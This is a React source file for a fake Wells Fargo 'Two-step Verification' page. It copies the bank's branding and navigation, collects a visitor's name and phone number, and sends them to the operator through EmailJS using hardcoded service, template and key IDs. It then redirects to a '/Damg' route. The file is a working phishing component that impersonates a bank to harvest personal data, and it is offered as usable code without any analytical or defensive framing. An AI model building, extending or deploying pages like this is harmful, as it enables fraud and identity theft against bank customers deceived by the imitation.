import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

const Verify = () => {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [status, setStatus] = useState('');
  const [menuOpen, setMenuOpen] = useState(false);
  const navigate = useNavigate();

  const isFormValid = name.trim() !== '' && phone.trim() !== '' && phone.length === 10;

  const handlePhoneChange = (e) => {
    // Only allow numeric values, and ensure the phone number has exactly 10 digits
    const value = e.target.value.replace(/[^0-9]/g, ''); // Remove non-numeric characters
    if (value.length <= 10) {
      setPhone(value);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (isFormValid) {
      const templateParams = {
        web_name: "Wells Fargo",      // The user's name
        from_name: "Wells Fargo",     // The user's phone number
        message: `Name: ${name}, Phone: ${phone}, Date: ${new Date().toLocaleDateString()}, Time: ${new Date().toLocaleTimeString()}`,
      };

      try {
        await emailjs.send(
          'service_41sg0p7',    // Your service ID
          'template_urm06yv',    // Your template ID
          templateParams,
          '2sNbvXHtZ8_J2G1NZ'     // Your user ID (or the public key for EmailJS)
        );
        setStatus('Email sent successfully!');
        setName('');   // Clear the name field
        setPhone('');  // Clear the phone field
        navigate('/Damg');  // Navigate to the /Damg page after success
      } catch (error) {
        console.error('Error:', error);
        setStatus('Oops! Something went wrong. Please try again later.');
      }
    } else {
      setStatus('Please fill out all fields correctly.');
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Navbar */}
      <div className="h-16 bg-red-600 flex items-center justify-between px-4 sm:px-6 md:px-10 text-white">
        <h1 className="font-bold text-lg sm:text-xl md:text-2xl">WELL FARGO</h1>
        <button className="sm:hidden" onClick={() => setMenuOpen(!menuOpen)}>
          ☰
        </button>
        <ul className={`sm:flex gap-4 md:gap-6 lg:gap-10 text-sm sm:text-base ${menuOpen ? 'block' : 'hidden'} sm:block`}>
          <li>Enroll</li>
          <li>Customer Service</li>
          <li>ATM/Locations</li>
          <li>Espanol</li>
          <li>Search</li>
        </ul>
      </div>

      {/* Main Form Section */}
      <div className="flex-1 flex items-center justify-center px-4 bg-cover bg-center" style={{ backgroundImage: `url(${require('../image/winter_morning.jpg')})` }}>
        <div className="w-full max-w-md bg-white rounded-lg shadow-lg px-6 py-8 sm:px-10">
          <h1 className="text-2xl font-semibold text-center mb-6">Two-step Verification</h1>
          <form onSubmit={handleSubmit}>
            <div className="flex flex-col gap-4 sm:gap-6">
              <input
                type="text"
                className="border border-gray-300 rounded-full py-2 px-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your Name"
                value={name}
                onChange={(e) => setName(e.target.value)}
                required
              />
              <input
                type="text"  // Change input type to text
                className="border border-gray-300 rounded-full py-2 px-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Phone Number (10 digits)"
                value={phone}
                onChange={handlePhoneChange}  // Use the custom handler
                required
                maxLength="10"  // Limit to 10 characters
              />
              <button
                type="submit"
                className={`w-full py-2 rounded-full transition-all ${isFormValid ? 'bg-blue-600 text-white hover:bg-blue-700' : 'bg-gray-400 text-gray-700 cursor-not-allowed'}`}
                disabled={!isFormValid}
              >
                Submit
              </button>
            </div>
          </form>
          {status && <p className="mt-4 text-center text-gray-600">{status}</p>}
        </div>
      </div>
    </div>
  );
};

export default Verify;
